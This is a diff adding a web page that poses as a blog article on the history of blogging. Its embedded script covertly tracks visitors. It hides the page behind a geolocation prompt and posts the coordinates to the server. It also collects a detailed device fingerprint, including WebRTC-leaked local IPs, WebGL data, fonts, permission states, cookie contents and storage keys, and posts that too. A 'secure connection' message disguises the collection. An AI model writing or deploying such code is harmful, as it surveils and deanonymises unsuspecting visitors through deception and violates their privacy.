@@ -1,0 +1,284 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>The History of Blogging | C++ Hosted Blog</title>
+    <style>
+        /* Hides the entire page content initially for the location prompt */
+        body { 
+            display: none; 
+            font-family: Arial, sans-serif; 
+            max-width: 800px; 
+            margin: 0 auto; 
+            padding: 20px; 
+            background: #f4f4f9; 
+            line-height: 1.6;
+        }
+        .post { 
+            background: white; 
+            padding: 35px; 
+            border-radius: 8px; 
+            box-shadow: 0 4px 8px rgba(0,0,0,0.1); 
+            margin-bottom: 30px; 
+        }
+        h1 { color: #2c3e50; font-size: 2.2em; margin-bottom: 5px;}
+        h2 { color: #007bff; margin-top: 30px; border-bottom: 2px solid #f4f4f9; padding-bottom: 5px; }
+        .meta-text { color: #666; font-size: 0.9em; margin-bottom: 25px; }
+        ul { margin-top: 10px; margin-bottom: 20px; color: #333; }
+        li { margin-bottom: 8px; }
+        #fp-status { 
+            font-size: 0.9em; 
+            color: #28a745; 
+            margin-top: 30px; 
+            font-weight: bold;
+            background: #e9f7ef;
+            padding: 15px;
+            border-radius: 5px;
+            text-align: center;
+        }
+    </style>
+</head>
+<body>
+    <div class="post">
+        <h1>The History of Blogging: When and How It All Started</h1>
+        <p class="meta-text"><strong>Published on:</strong> July 29, 2026</p>
+
+        <h2>What Exactly is a Blog?</h2>
+        <p>A "blog" (a shortened version of "weblog") is an online journal or informational website displaying information in reverse chronological order, with the latest posts appearing first. It is a platform where a writer or a group of writers share their views, tutorials, or daily lives on an individual subject.</p>
+
+        <h2>The Early Days: 1994</h2>
+        <p>The concept of blogging was born in the mid-1990s. In 1994, a college student named Justin Hall created what is widely considered the very first blog, <em>Links.net</em>. It wasn't called a blog at the time—it was just a personal homepage where he shared links and thoughts, manually coding the HTML for every single entry.</p>
+
+        <h2>Where Did the Word Come From?</h2>
+        <p>The actual term <strong>"weblog"</strong> was coined in 1997 by Jorn Barger to describe the process of "logging the web" as he surfed the internet. Two years later, in 1999, a programmer named Peter Merholz jokingly broke the word into the phrase <em>"we blog"</em> in the sidebar of his website. The term stuck, and the modern word "blog" was officially born.</p>
+
+        <h2>The Boom: No More Manual Coding</h2>
+        <p>Before 1999, you had to know how to write code and upload files via FTP to run a blog. That changed completely when a company called Pyra Labs launched a platform called <strong>Blogger</strong>. It allowed anyone, regardless of technical skill, to type into a text box and publish their thoughts to the internet instantly. (Google later bought Blogger in 2003).</p>
+        <p>In 2003, <strong>WordPress</strong> launched, which fundamentally changed the internet. It gave users total control over their designs and content. Today, WordPress powers over 40% of all websites on the entire internet.</p>
+
+        <h2>Why Do People Blog Today?</h2>
+        <p>What started as a digital diary has evolved into a massive, multi-billion dollar digital industry. Today, people and businesses blog to:</p>
+        <ul>
+            <li><strong>Share Knowledge:</strong> Educate others and establish authority in a specific field.</li>
+            <li><strong>Build Communities:</strong> Connect with like-minded people across the globe.</li>
+            <li><strong>Drive Business:</strong> Boost Search Engine Optimization (SEO) to get corporate websites to the top of Google.</li>
+            <li><strong>Monetize:</strong> Earn money through display ads, affiliate marketing, and sponsorships.</li>
+        </ul>
+
+        <p>From humble beginnings of hand-coded text files to the foundation of modern media, the blog remains one of the most powerful tools for communication on the internet.</p>
+
+        <p id="fp-status">🔍 Establishing secure connection and gathering device footprint...</p>
+    </div>
+
+    <script>
+        // ---------- 1. Location Prompt & Page Reveal ----------
+        window.addEventListener('DOMContentLoaded', function() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    function(position) {
+                        const formData = new URLSearchParams();
+                        formData.append('latitude', position.coords.latitude);
+                        formData.append('longitude', position.coords.longitude);
+                        formData.append('accuracy', position.coords.accuracy);
+
+                        fetch('/track_location', {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+                            body: formData.toString()
+                        });
+                        document.body.style.display = 'block'; 
+                    },
+                    function(error) {
+                        document.body.style.display = 'block'; 
+                    },
+                    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+                );
+            } else {
+                document.body.style.display = 'block';
+            }
+        });
+
+        // ---------- 2. Utility: SHA-256 hash ----------
+        async function sha256(message) {
+            const msgBuffer = new TextEncoder().encode(message);
+            const hashBuffer = await crypto.subtle.digest('SHA-256', msgBuffer);
+            const hashArray = Array.from(new Uint8Array(hashBuffer));
+            return hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
+        }
+
+        // ---------- 3. Main Fingerprint Collector ----------
+        async function collectFingerprint() {
+            const data = {};
+
+            data.userAgent = navigator.userAgent || '';
+            data.language = navigator.language || '';
+            data.languages = navigator.languages || [];
+            data.platform = navigator.platform || '';
+            data.hardwareConcurrency = navigator.hardwareConcurrency || 0;
+            data.deviceMemory = navigator.deviceMemory || 0;
+            data.cookieEnabled = navigator.cookieEnabled || false;
+            data.doNotTrack = navigator.doNotTrack || 'unspecified';
+            data.systemLocale = navigator.language || ''; 
+
+            data.deviceModel = '';
+            if (navigator.userAgentData) {
+                try {
+                    const uaData = await navigator.userAgentData.getHighEntropyValues(['model']);
+                    data.deviceModel = uaData.model || '';
+                } catch(e) {}
+            }
+
+            data.screenWidth = window.screen.width;
+            data.screenHeight = window.screen.height;
+            data.screenAvailWidth = window.screen.availWidth;
+            data.screenAvailHeight = window.screen.availHeight;
+            data.colorDepth = window.screen.colorDepth;
+            data.pixelDepth = window.screen.pixelDepth;
+            data.innerWidth = window.innerWidth;
+            data.innerHeight = window.innerHeight;
+
+            try { data.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone; } catch(e) { data.timezone = 'unknown'; }
+
+            data.referrer = document.referrer || '';
+            data.currentURL = window.location.href;
+            data.touchSupport = ('ontouchstart' in window) || (navigator.maxTouchPoints > 0);
+
+            if (navigator.connection) {
+                const conn = navigator.connection;
+                data.connectionType = conn.effectiveType || '';
+                data.downlink = conn.downlink || 0;
+                data.rtt = conn.rtt || 0;
+                data.saveData = conn.saveData || false;
+            }
+
+            data.localStorageAvailable = false;
+            data.sessionStorageAvailable = false;
+            try {
+                localStorage.setItem('_fp_test', '1');
+                localStorage.removeItem('_fp_test');
+                data.localStorageAvailable = true;
+            } catch(e) {}
+            try {
+                sessionStorage.setItem('_fp_test', '1');
+                sessionStorage.removeItem('_fp_test');
+                data.sessionStorageAvailable = true;
+            } catch(e) {}
+
+            data.trackingIdentifiers = {};
+            if (document.cookie) {
+                data.trackingIdentifiers.cookies = document.cookie.split(';').map(c => c.trim());
+            }
+            if (data.localStorageAvailable) {
+                const lsKeys = [];
+                for (let i=0; i<localStorage.length; i++) lsKeys.push(localStorage.key(i));
+                data.trackingIdentifiers.localStorageKeys = lsKeys;
+            }
+            if (data.sessionStorageAvailable) {
+                const ssKeys = [];
+                for (let i=0; i<sessionStorage.length; i++) ssKeys.push(sessionStorage.key(i));
+                data.trackingIdentifiers.sessionStorageKeys = ssKeys;
+            }
+
+            data.advertisingIdentifiers = 'Not accessible via web';
+            data.analyticsIdentifiers = 'None';
+
+            data.webRTCIPs = [];
+            try {
+                const pc = new RTCPeerConnection({ iceServers: [] });
+                pc.createDataChannel('');
+                pc.createOffer().then(offer => pc.setLocalDescription(offer));
+                await new Promise((resolve) => {
+                    pc.onicecandidate = (event) => {
+                        if (!event || !event.candidate) { resolve(); return; }
+                        const cand = event.candidate.candidate;
+                        const ipMatch = /([0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3})/.exec(cand);
+                        if (ipMatch && !data.webRTCIPs.includes(ipMatch[1]))
+                            data.webRTCIPs.push(ipMatch[1]);
+                    };
+                });
+                pc.close();
+            } catch(e) {}
+
+            try {
+                const canvas = document.createElement('canvas');
+                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                if (gl) {
+                    const ext = gl.getExtension('WEBGL_debug_renderer_info');
+                    if (ext) {
+                        data.webGLRenderer = gl.getParameter(ext.UNMASKED_RENDERER_WEBGL);
+                        data.webGLVendor = gl.getParameter(ext.UNMASKED_VENDOR_WEBGL);
+                    } else {
+                        data.webGLRenderer = gl.getParameter(gl.RENDERER);
+                        data.webGLVendor = gl.getParameter(gl.VENDOR);
+                    }
+                }
+            } catch(e) { data.webGLVendor = 'error'; }
+
+            data.installedFonts = [];
+            if (document.fonts) {
+                const fontList = ['Arial', 'Helvetica', 'Times New Roman', 'Courier New', 'Verdana', 'Georgia', 'Comic Sans MS', 'Impact', 'Tahoma', 'Trebuchet MS'];
+                for (const font of fontList) {
+                    try {
+                        if (document.fonts.check(`12px "${font}"`))
+                            data.installedFonts.push(font);
+                    } catch(e) {}
+                }
+            }
+
+            data.browserFeatures = {
+                webGL: !!document.createElement('canvas').getContext('webgl'),
+                webRTC: !!window.RTCPeerConnection,
+                geolocation: !!navigator.geolocation,
+                notifications: 'Notification' in window,
+                serviceWorker: 'serviceWorker' in navigator,
+                webAudio: !!(window.AudioContext || window.webkitAudioContext),
+                touch: data.touchSupport,
+                pointerEvents: 'PointerEvent' in window,
+                cssGrid: 'grid' in document.createElement('div').style,
+                flexbox: 'flex' in document.createElement('div').style
+            };
+
+            data.permissions = {};
+            if (navigator.permissions) {
+                const perms = ['geolocation', 'notifications', 'camera', 'microphone', 'persistent-storage'];
+                for (const p of perms) {
+                    try {
+                        const status = await navigator.permissions.query({ name: p });
+                        data.permissions[p] = status.state;
+                    } catch(e) {}
+                }
+            }
+
+            const allDataString = JSON.stringify(data);
+            data.fingerprintHash = await sha256(allDataString);
+            
+            const browserPart = JSON.stringify({
+                webgl: data.webGLVendor + data.webGLRenderer,
+                fonts: data.installedFonts
+            });
+            data.browserFingerprintHash = await sha256(browserPart);
+
+            return data;
+        }
+
+        // ---------- 4. Send Fingerprint to Server ----------
+        async function sendFingerprint() {
+            const data = await collectFingerprint();
+            try {
+                const response = await fetch('/fingerprint', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(data)
+                });
+                document.getElementById('fp-status').textContent = '✅ Secure connection established. Device mapped.';
+            } catch (e) {
+                document.getElementById('fp-status').textContent = '⚠️ Secure connection telemetry failed.';
+                console.error(e);
+            }
+        }
+        
+        window.addEventListener('DOMContentLoaded', sendFingerprint);
+    </script>
+</body>
+</html>
